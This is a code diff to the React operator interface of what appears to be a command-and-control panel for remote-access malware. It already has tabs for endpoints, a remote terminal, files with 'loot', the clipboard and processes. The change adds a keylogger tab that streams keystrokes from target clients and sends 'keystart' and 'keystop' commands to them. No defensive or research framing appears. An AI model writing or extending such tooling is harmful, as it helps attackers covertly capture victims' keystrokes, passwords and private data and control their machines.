@@ -13,6 +13,7 @@ import TerminalView from './components/Terminal';
 import FileExplorer from './components/FileExplorer';
 import ProcessManager from './components/ProcessManager';
 import AppsExplorer from './components/AppsExplorer';
+import KeyLogger from './components/KeyLogger';
 import ClipboardView from './components/ClipboardView';
 import DatabaseView from './components/DatabaseView';
 import SettingsView from './components/SettingsView';
@@ -33,7 +34,7 @@ function AppInner() {
     c2OperatorToken: operatorTokenForSse,
   } = useC2();
 
-  const [activeTab, setActiveTab] = useState<'dashboard' | 'endpoints' | 'terminal' | 'files' | 'processes' | 'apps' | 'clipboard' | 'database' | 'settings'>('dashboard');
+  const [activeTab, setActiveTab] = useState<'dashboard' | 'endpoints' | 'terminal' | 'files' | 'processes' | 'apps' | 'keylogger' | 'clipboard' | 'database' | 'settings'>('dashboard');
   const [logs, setLogs] = useState<CommandLog[]>([]);
   const [appsList, setAppsList] = useState<InstalledApp[]>([]);
   const [isAppsLoading, setIsAppsLoading] = useState(false);
@@ -64,6 +65,13 @@ function AppInner() {
   const mergeAppIcons = useCallback((icons: Record<string, string>) => {
     setAppIcons(prev => ({ ...prev, ...icons }));
   }, []);
+
+  const [keylogFeed, setKeylogFeed] = useState('');
+  const [isKeylogStreaming, setIsKeylogStreaming] = useState(false);
+  const appendKeylogChunk = useCallback((chunk: string) => {
+    setKeylogFeed(prev => (prev + chunk).slice(-200_000));
+  }, []);
+  const clearKeylogView = useCallback(() => setKeylogFeed(''), []);
 
   const [fileSubTab, setFileSubTab] = useState<'explorer' | 'loot'>('explorer');
 
@@ -189,6 +197,8 @@ function AppInner() {
     mergeAppIcons,
     parseFileList,
     appendTermLog,
+    appendKeylogChunk,
+    setIsKeylogStreaming,
     setC2ConnectionStatus,
     showToast,
   });
@@ -273,6 +283,16 @@ function AppInner() {
           )}
           {activeTab === 'apps' && (
             <AppsExplorer appsList={appsList} isAppsLoading={isAppsLoading} appIcons={appIcons} executeCommand={executeCommand} />
+          )}
+          {activeTab === 'keylogger' && (
+            <KeyLogger
+              feed={keylogFeed}
+              streaming={isKeylogStreaming}
+              hasTarget={!!selectedClientId || clients.length > 0}
+              onStart={() => { setActiveTab('keylogger'); executeCommand('keystart', true); }}
+              onStop={() => executeCommand('keystop', true)}
+              onClear={clearKeylogView}
+            />
           )}
           {activeTab === 'clipboard' && (<ClipboardView logs={logs} clients={clients} executeCommand={executeCommand} />)}
           {activeTab === 'database' && <DatabaseView logs={logs} />}
